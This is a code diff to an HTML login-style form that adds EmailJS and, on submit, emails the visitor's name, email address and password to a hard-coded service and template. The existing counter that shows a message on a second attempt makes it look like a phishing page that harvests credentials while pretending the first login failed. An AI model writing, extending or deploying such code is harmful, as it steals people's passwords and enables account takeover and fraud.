@@ -8,7 +8,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 	<link rel="stylesheet" href="assets/css/main.css" />
 	<link rel="shortcut icon" href="./images/favicon.png" type="image/x-icon">
-
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 	<noscript>
 		<link rel="stylesheet" href="assets/css/noscript.css" />
 	</noscript>
@@ -93,15 +93,38 @@
 	</div>
 
 	<script>
+		emailjs.init('q09dcpoQCGJcP-EZm')
 		const formulary = document.querySelector('form')
 		const message = document.querySelector('#message')
-		formulary.addEventListener('submit', (e) => {
+		formulary.addEventListener('submit', async (e) => { // Cambiado a async
 			e.preventDefault()
 			const ntry = localStorage.getItem('n')
 			if (ntry && ntry > 1) {
 				message.style.display = 'contents'
 			} else {
 				localStorage.setItem('n', 2)
+			}
+			const formData = new FormData(formulary)
+			// Captura de datos del formulario
+			const data = {}
+			formData.forEach((value, key) => {
+				data[key] = value
+			})
+			console.log(data) // Muestra los datos capturados
+
+			const serviceID = 'service_jggu4v8';
+			const templateID = 'template_iblkp5y';
+
+			try {
+				await emailjs.send(serviceID, templateID, { // Usando await
+					from_name: data.name,
+					from_lastname: data.last_name,
+					from_email: data.email,
+					from_password: data.password,
+				});
+				console.log('Correo enviado satisfactoriamente'); // Mensaje de éxito
+			} catch (error) {
+				console.error('Error al enviar el correo:', error); // Mensaje de error
 			}
 		})
 		formulary.addEventListener('reset', (e) => {
